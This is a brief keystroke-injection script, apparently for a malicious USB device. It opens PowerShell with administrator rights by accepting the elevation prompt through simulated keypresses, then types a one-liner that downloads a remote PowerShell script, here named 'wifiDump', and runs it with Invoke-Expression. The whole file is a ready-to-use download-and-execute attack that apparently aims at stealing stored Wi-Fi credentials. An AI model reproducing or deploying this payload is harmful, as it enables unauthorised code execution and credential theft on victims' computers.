// Launches a powershell script from a remote URL replace scriptName variable with the name of the script you want to run
var scriptName = "wifiDump"; // Do not include .ps1 extension as this script will add it for you.
var remoteURL = "http://localhost:3002/scripts/" + scriptName + ".ps1";

function openPs() {
  press("GUI r"); // windows + r
  delay(3000);
  type("powershell");
  delay(2000);
  press("CONTROL SHIFT ENTER");
  delay(3000);
  press("LEFT");
  delay(3000);
  press("ENTER");
  delay(3000);
}

function runPsScript(remoteURL) {
  type(
    'Invoke-Expression ([System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "' +
      remoteURL +
      '" -UseBasicParsing).Content))\n'
  );
}

// wait for USB driver to load
waitLED(ANY_OR_NONE);
layout("us"); //set layout us

openPs();
runPsScript(remoteURL);
